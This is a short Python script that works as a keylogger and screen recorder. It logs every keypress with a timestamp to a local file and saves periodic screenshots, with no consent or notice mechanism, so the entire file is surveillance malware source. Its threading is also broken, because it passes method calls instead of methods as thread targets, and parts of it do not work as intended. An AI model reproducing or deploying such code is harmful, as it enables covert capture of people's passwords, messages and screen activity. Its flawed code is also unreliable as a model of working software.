from mss import mss
from pynput.keyboard import Listener
import time
from threading import Timer, Thread
import os

class IntervalTimer(Timer):
    def run(self):
        while not self.finished.wait(self.interval):
            self.function(*self.args, **self.kwargs)

class Monitor:

    def _on_press(self, k):
        with open('./logs/keylogs/logs.txt', 'a') as f:
            f.write('{}\t\t{}\n'.format(k, time.time()))

    def _build_logs(self):
        if not os.path.exists('./logs'):
            os.makedirs("logs/keylogs/")
            os.makedirs("logs/screenshots/")

    def _keylogger(self):
        with Listener(on_press= self._on_press) as listener:
            listener.join()

    def _screenshot(self):
        sct = mss()
        sct.shot(output='./logs/screenshots/{}.png'.format(time.time()))


    def run(self, interval = 1):

        self._build_logs()

        Thread(target=self._screenshot()).start()
        Thread(target=self._keylogger()).start()
        IntervalTimer(interval, self._screenshot()).start()

if __name__ == '__main__':
    mon = Monitor()
    mon.run()